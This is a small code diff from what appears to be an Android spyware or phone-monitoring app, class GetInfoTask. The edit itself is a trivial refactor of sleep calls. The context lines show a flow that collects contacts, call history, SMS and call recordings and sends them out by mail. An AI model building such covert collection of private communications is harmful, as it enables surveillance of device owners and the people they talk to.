@@ -137,11 +137,11 @@ public class GetInfoTask extends TimerTask
 			
 				// Collect information
 				CollectContact(context);
-				SysUtils.threadSleep(1000, LOGTAG);
+				SysUtils.threadSleep(1000);
 				CollectPhoneCallHist(context);
-				SysUtils.threadSleep(1000, LOGTAG);
+				SysUtils.threadSleep(1000);
 				CollectSms(context);
-				SysUtils.threadSleep(1000, LOGTAG);
+				SysUtils.threadSleep(1000);
 			
 				if (NetworkUtil.isNetworkConnected(context)) {
 					// Send mail
@@ -178,7 +178,7 @@ public class GetInfoTask extends TimerTask
 		// ===================================================================================
 		// Try to send phone call recording
 		// ===================================================================================
-		SysUtils.threadSleep(1000, LOGTAG);
+		SysUtils.threadSleep(1000);
 		
 		// Get all wav files
 		List<File> wavs = FileCtrl.getAllWavFiles(context);
